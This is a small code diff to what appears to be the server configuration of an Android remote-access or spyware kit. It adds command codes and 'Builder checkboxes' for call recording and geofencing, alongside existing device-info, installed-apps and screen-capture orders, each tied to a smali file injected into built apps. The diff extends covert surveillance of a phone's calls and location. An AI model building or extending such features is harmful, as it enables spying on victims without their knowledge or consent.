@@ -172,6 +172,8 @@ exports.orders = {
   deviceInfo: 'x0000di',
   installedApps: 'x0000ia',
   screenCapture: 'x0000sc',
+  callRecording: 'x0000cr',
+  geofencing: 'x0000gf',
 }
 
 //---------------------Optional Features (Builder checkboxes)---------------
@@ -193,5 +195,17 @@ exports.features = [
     file: 'k.smali',
     orderCode: 'x0000sc',
     label: 'Screen Capture'
+  },
+  {
+    id: 'Feature4',
+    file: 'l.smali',
+    orderCode: 'x0000cr',
+    label: 'Call Recording'
+  },
+  {
+    id: 'Feature5',
+    file: 'm.smali',
+    orderCode: 'x0000gf',
+    label: 'Geofencing'
   }
 ];
